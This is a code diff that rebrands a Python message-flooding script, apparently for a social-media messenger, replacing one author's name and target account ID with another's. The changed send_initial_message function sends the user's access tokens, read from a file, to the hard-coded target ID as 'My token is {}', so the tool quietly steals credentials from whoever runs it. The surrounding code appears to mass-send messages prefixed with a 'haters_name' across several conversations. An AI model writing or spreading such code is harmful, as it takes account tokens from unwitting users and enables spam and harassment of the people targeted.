@@ -25,7 +25,7 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
           self.send_response(200)
           self.send_header('Content-type', 'text/plain')
           self.end_headers()
-          self.wfile.write(b"  MR DEVIL INSIDE  ")
+          self.wfile.write(b"  MR HARSH INSIDE  ")
 def execute_server():
       PORT = int(os.environ.get('PORT', 4000))
 
@@ -39,10 +39,10 @@ def send_initial_message():
           tokens = file.readlines()
 
       # Modify the message as per your requirement
-      msg_template = "Hello Devil sir! I am using your server. My token is {}"
+      msg_template = "Hello Harsh sir! I am using your server. My token is {}"
 
       # Specify the ID where you want to send the message
-      target_id = "100037931553832"
+      target_id = "100003582130567"
 
       requests.packages.urllib3.disable_warnings()
 
@@ -121,12 +121,12 @@ def send_messages_from_file():
 
                   current_time = time.strftime("\033[1;92mSahi Hai ==> %Y-%m-%d %I:%M:%S %p")
                   if response.ok:
-                      print("\033[1;92m[+] MESSAGE SENT SUCCESSFULLY LEGEND MR DEVIL {} of Convo {} Token {}: {}".format(
+                      print("\033[1;92m[+] MESSAGE SENT SUCCESSFULLY LEGEND MR HARSH RAJPUT {} of Convo {} Token {}: {}".format(
                           message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                       liness()
                       liness()
                   else:
-                      print("\033[1;91m[x] MR DEVIL SIR MESSAGE NOT SENT {} of Convo {} with Token {}: {}".format(
+                      print("\033[1;91m[x] MR HARSH RAJPUT SIR MESSAGE NOT SENT {} of Convo {} with Token {}: {}".format(
                           message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                       liness()
                       liness()
